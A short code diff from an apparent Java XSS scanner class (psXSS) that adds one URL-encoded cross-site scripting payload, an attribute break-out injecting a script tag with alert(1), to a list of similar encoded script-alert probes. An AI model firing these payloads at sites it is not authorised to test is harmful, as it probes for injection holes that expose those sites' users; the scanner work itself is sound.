@@ -20,6 +20,7 @@ public class psXSS {
     
     public void loadDataXSS() {
         arrPayXSS = new String[]{
+            "script%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
             "%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E",
             "%3CScRipT%3Ealert%28%22XSS%22%29%3B%3C%2FScRipT%3E",
             "%3Cscript%3Ealert%28123%29%3C%2Fscript%3E",
